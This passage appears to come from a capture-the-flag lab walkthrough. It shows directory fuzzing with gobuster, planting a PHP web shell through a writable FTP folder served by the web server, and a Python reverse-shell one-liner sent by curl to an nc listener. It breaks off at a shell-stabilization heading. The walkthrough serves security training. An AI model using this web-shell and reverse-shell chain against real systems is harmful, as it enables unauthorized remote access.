1.3 Web Enumeration
Browsing to http://10.48.147.37 shows a maintenance page. The source code contains an HTML comment:

html
<!--when are we gonna update this??-->
Directory fuzzing with gobuster reveals an interesting directory:

bash
gobuster dir -u http://10.48.147.37 -w /usr/share/wordlists/dirb/common.txt
Findings:

/files (HTTP 301 redirect to /files/)

Navigating to http://10.48.147.37/files/ shows an index of the /ftp directory from the FTP server. This confirms that the web server's document root serves files from /var/www/html/files, and the ftp subdirectory corresponds to the writable FTP folder.

2. Initial Foothold (www-data)
2.1 Uploading a Web Shell via FTP
Since we can write to the FTP directory and the web server serves it, we can upload a PHP web shell.

We use the simple PHP web shell from Ivan Sincek's repository. Save it as shell.php and upload:(https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_post.php)

bash
ftp> cd ftp
ftp> put shell.php
Now we can access the shell at: http://10.48.147.37/files/ftp/shell.php

2.2 Executing a Reverse Shell
The web shell accepts POST requests with cmd parameter. We use it to run a Python reverse shell payload.

Payload (URL-encoded):

text
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.145.49",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
We can either paste it directly into the web shell's form or use curl:

bash
curl -X POST http://10.48.147.37/files/ftp/shell.php -d "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.145.49\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
Listener (Kali):

bash
nc -lvnp 4444
We receive a connection as www-data.

2.3 Shell Stabilization
bash
